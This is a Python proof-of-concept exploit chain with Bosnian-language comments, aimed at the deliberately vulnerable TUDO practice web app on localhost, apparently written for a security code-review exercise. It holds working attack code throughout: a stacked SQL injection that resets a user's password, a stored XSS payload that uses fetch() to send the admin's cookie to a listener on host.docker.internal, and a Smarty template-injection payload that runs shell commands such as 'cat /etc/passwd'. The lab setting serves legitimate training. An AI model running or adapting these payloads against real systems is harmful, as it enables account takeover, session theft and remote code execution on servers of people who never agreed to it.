#!/usr/bin/env python3
"""
TUDO (bmdyy/tudo) - Remote Code Execution Exploit
===================================================
Zadatak: Security Code Review and Analysis
Target:  http://localhost:8000

Statickom analizom koda uocavamo da admin stranica `admin/update_motd.php`
dozvoljava administratoru da upisuje proizvoljan sadrzaj u fajl `templates/motd.tpl`:

    $t_file = fopen("../templates/motd.tpl","w");
    fwrite($t_file, $message);
    fclose($t_file);

Ovaj template se zatim renderuje na `index.php` koriscenjem Smarty template engine-a:

    $smarty = new Smarty();
    $smarty->assign("username", $_SESSION['username']);
    $smarty->force_compile = true;
    echo $smarty->fetch("motd.tpl");

Smarty podrZava izvrsavanje PHP koda kroz svoje tagove. Konkretno, tag
`{system('komanda')}` poziva PHP funkciju system() i ispisuje rezultat.
Posto ne postoji nikakva sanitizacija unesenog sadrzaja prije pisanja u
template fajl, napadac koji ima admin sesiju moze injektovati Smarty
payload koji ce biti izvrsn pri svakom ucitavanju index.php.

Pretpostavke:
    - Imamo admin PHPSESSID cookie (dobijen kroz priv_exc.py)

Exploit chain:
    1. Prijavi se kao user1 (SQLi login bypass iz login_bypass.py)
    2. Ukrademo admin sesiju (XSS iz priv_exc.py)
    3. Upisemo Smarty SSTI payload u motd.tpl kao admin
    4. Posjetimo index.php kao admin - payload se izvrsava

Upotreba:
    python3 rce.py
    python3 rce.py --target http://localhost:8000 --cmd "id"
    python3 rce.py --target http://localhost:8000 --session <PHPSESSID> --cmd "id"
    python3 rce.py --target http://localhost:8000 --cmd "cat /etc/passwd"
"""

import argparse
import base64
import sys
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

try:
    import requests
except ImportError:
    print("[!] Instaliraj requests: pip install requests")
    sys.exit(1)

TARGET   = "http://localhost:8000"
USERNAME = "user1"
PASSWORD = "user1"
LHOST    = "host.docker.internal"
LPORT    = 8001


# ---------------------------------------------------------------------------
# Korak 1: Login bypass - SQLi u forgotusername.php
# ---------------------------------------------------------------------------

def login_bypass(base: str) -> requests.Session:
    """
    Ranjivi kod (forgotusername.php):

        $ret = pg_query($db, "select * from users where username='".$username."';");

    Koristimo stacked query da promijenimo sifru user1, pa se prijavljujemo.
    """
    print("\n[*] Korak 1: Login bypass putem SQL injection...")

    new_pass      = "pwned_rce"
    new_pass_hash = __import__('hashlib').sha256(new_pass.encode()).hexdigest()

    payload = f"'; UPDATE users SET password='{new_pass_hash}' WHERE username='user1'; --"
    requests.post(f"{base}/forgotusername.php", data={"username": payload})
    print(f"    [+] Sifra user1 promijenjena na: {new_pass}")

    s = requests.Session()
    r = s.post(f"{base}/login.php",
               data={"username": "user1", "password": new_pass},
               allow_redirects=False)

    if r.status_code == 302:
        print(f"    [+] Prijava uspjesna kao 'user1'")
        return s
    else:
        print("    [-] Prijava nije uspjela")
        sys.exit(1)


# ---------------------------------------------------------------------------
# Korak 2: Kradzja admin sesije - XSS u profile.php
# ---------------------------------------------------------------------------

stolen_cookie = None

class CookieListener(BaseHTTPRequestHandler):
    def do_GET(self):
        global stolen_cookie
        encoded = self.path.lstrip('/')
        try:
            stolen_cookie = base64.b64decode(encoded).decode()
        except Exception:
            stolen_cookie = self.path
        self.send_response(200)
        self.end_headers()
        threading.Thread(target=self.server.shutdown).start()

    def log_message(self, format, *args):
        pass  # ugasi apache-style logove


def steal_admin_cookie(base: str, user_session: requests.Session) -> str:
    """
    Ranjivi kod (profile.php):

        $ret = pg_execute($db, "updatedescription_query", Array($description, $_SESSION['username']));

    Opis profila se cuva bez sanitizacije i prikazuje na index.php u admin tabeli:

        echo '<td>'.$row[3].'</td>';

    Injektujemo XSS payload koji salje admin cookie na nas HTTP server.
    Admin bot posjecuje index.php svaki minut.
    """
    print("\n[*] Korak 2: Kradzja admin sesije putem XSS...")

    xss_payload = (
        f'<img src=x onerror=\'fetch("http://{LHOST}:{LPORT}/"+btoa(document.cookie))\'>'
    )

    user_session.post(f"{base}/profile.php", data={"description": xss_payload})
    print(f"    [+] XSS payload upisan u opis profila")
    print(f"    [+] Pokrecemo HTTP listener na portu {LPORT}...")
    print(f"    [*] Cekamo admin bota (cronjob svakih ~60s)...")

    server  = HTTPServer(('0.0.0.0', LPORT), CookieListener)
    listener = threading.Thread(target=server.serve_forever)
    listener.start()
    listener.join(timeout=75)

    if not stolen_cookie:
        print("    [-] Admin cookie nije stigao u roku od 75s. Pokusaj ponovo.")
        sys.exit(1)

    cookie_dict = dict(
        p.strip().split('=', 1)
        for p in stolen_cookie.split(';')
        if '=' in p
    )
    phpsessid = cookie_dict.get('PHPSESSID')
    print(f"    [+] Ukradeni cookie: {stolen_cookie}")
    print(f"    [+] PHPSESSID: {phpsessid}")
    return phpsessid


# ---------------------------------------------------------------------------
# Korak 3: RCE putem Smarty SSTI
# ---------------------------------------------------------------------------

def rce_ssti(base: str, phpsessid: str, command: str) -> str:
    """
    Ranjivi kod (admin/update_motd.php):

        $t_file = fopen("../templates/motd.tpl","w");
        fwrite($t_file, $message);

    Smarty tag {system('cmd')} se izvrsava kada index.php renderuje motd.tpl:

        echo $smarty->fetch("motd.tpl");

    Upisemo payload kao admin, pa posjetimo index.php da ga trigerujemo.
    """
    print(f"\n[*] Korak 3: RCE putem Smarty SSTI (update_motd.php)...")

    ssti_payload = "{php}echo shell_exec('" + command + "');{/php}"
    print(f"    Smarty payload: {ssti_payload}")
    print(f"    Objasnjenje: Smarty 2.x podrZava {{php}} tag koji izvrsava PHP direktno.")

    admin_session = requests.Session()
    admin_session.cookies.set('PHPSESSID', phpsessid)

    r = admin_session.post(f"{base}/admin/update_motd.php",
                           data={"message": ssti_payload},
                           allow_redirects=False)

    if r.status_code not in (200, 302):
        print(f"    [-] Pisanje u motd.tpl nije uspjelo (HTTP {r.status_code})")
        sys.exit(1)

    print(f"    [+] Payload upisan u motd.tpl")
    print(f"    [+] Pozivamo index.php da triggerujemo izvrsavanje...")

    r = admin_session.get(f"{base}/index.php")

    import re

    # Smarty {system()} ispisuje rezultat direktno u HTML output prije HTML tagova.
    # Uklonimo sve HTML tagove i pretrazimo cijeli tekst.
    clean = re.sub(r'<[^>]+>', '\n', r.text)
    clean = re.sub(r'\n{2,}', '\n', clean).strip()

    output = ""
    for line in clean.splitlines():
        line = line.strip()
        if not line:
            continue
        # Tipican izlaz 'id' komande
        if "uid=" in line and "gid=" in line:
            output = line
            break
        # Izlaz 'whoami' - samo korisnicko ime
        if command.strip() == "whoami" and line in ("root", "www-data", "apache"):
            output = line
            break

    # Za sve ostale komande - uzmi prvih 500 znakova teksta oko MoTD sekcije
    if not output:
        if "[MoTD]" in clean:
            idx = clean.index("[MoTD]")
            after = clean[idx + len("[MoTD]"):idx + 500]
            lines = [l.strip() for l in after.splitlines() if l.strip()]
            output = "\n".join(lines[:5]) if lines else ""
        if not output:
            output = clean[:500]

    return output


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="TUDO RCE PoC - Smarty SSTI via update_motd.php",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Primjeri:
  python3 rce.py
  python3 rce.py --target http://localhost:8000 --cmd "id"
  python3 rce.py --target http://localhost:8000 --cmd "cat /etc/passwd"
  python3 rce.py --target http://localhost:8000 --session <PHPSESSID> --cmd "id"
        """
    )
    parser.add_argument("--target",  default=TARGET,
                        help=f"Base URL aplikacije (default: {TARGET})")
    parser.add_argument("--cmd",     default="id",
                        help="Komanda za izvrsavanje (default: id)")
    parser.add_argument("--session", default=None,
                        help="Postojeci admin PHPSESSID (preskoci korake 1 i 2)")
    args = parser.parse_args()

    print("=" * 55)
    print("  TUDO - Remote Code Execution PoC")
    print("  github.com/bmdyy/tudo")
    print("=" * 55)
    print(f"\n[*] Target:  {args.target}")
    print(f"[*] Komanda: {args.cmd}")

    if args.session:
        # Preskoci login bypass i XSS - koristimo dati session
        print(f"\n[*] Koriscenje postojece admin sesije: {args.session}")
        phpsessid = args.session
    else:
        # Korak 1: Login bypass
        user_session = login_bypass(args.target)

        # Korak 2: Kradzja admin cookie
        phpsessid = steal_admin_cookie(args.target, user_session)

    # Korak 3: RCE
    output = rce_ssti(args.target, phpsessid, args.cmd)

    print("\n" + "=" * 55)
    print("  IZLAZ KOMANDE")
    print("=" * 55)
    print(output if output else "(prazan izlaz - provjeri da li je admin sesija validna)")
    print("=" * 55)

    if output:
        print("\n[+] RCE USPJESAN!")
        print(f"    Payload ostaje aktivan u motd.tpl.")
        print(f"    Primjer daljeg koristenja:")
        print(f"    python3 rce.py --target {args.target} --session {phpsessid} --cmd \"cat /etc/passwd\"")
    else:
        print("\n[-] RCE nije uspio.")
        print("    Provjeri da li je admin PHPSESSID validan i da li je aplikacija pokrenuta.")


if __name__ == "__main__":
    main()